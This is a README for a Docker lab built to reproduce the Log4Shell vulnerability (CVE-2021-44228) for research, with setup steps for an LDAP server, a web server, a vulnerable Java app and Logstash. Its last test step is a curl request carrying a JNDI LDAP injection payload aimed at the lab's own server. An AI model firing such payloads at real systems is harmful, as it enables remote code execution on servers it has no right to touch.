# CVE-2021-44228 Log3Shell Research Lab 🚧

A basic lab environment to test some of the public proof of concepts to trigger and learn more about [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and expedite the time it takes to deploy multiple scenarios.

## Docker Deployment

### Clone Repo

```
git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```
### Create Local Socket Proxy

```
docker network create --gateway 192.168.55.1 --subnet 192.168.55.0/24 socket_proxy
```

### Run Docker Compose File

```
docker-compose -f docker-compose.yml up --build -d
```

### Check Docker Containers

```
docker ps

docker logs --follow ldap-server

docker logs --follow web-server
```

## Run Vulnerable Apps

* [BasicJar](#basicjar)
* [Logstash](#logstash)

## BasicJar
### Compile

**Dockerized**
```
cd vulnApp
docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

**Locally**
```
cd vulnApp
mvn -f pom.xml clean package -DskipTests
```

### Run Application

```
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar  com.log4jshell.App
```

## Logstash

## Run Test

Monitor for Logstash logs

```
docker logs --follow logstash
```

Run test
```
curl -H "content-type: application/json" -XPUT 'http://127.0.0.1:8080/tweets/me' -d '"${jndi:ldap://192.168.55.10:1389/CreateFile}"'
```

## References
* https://www.smarthomebeginner.com/traefik-docker-security-best-practices/#9_Use_a_Docker_Socket_Proxy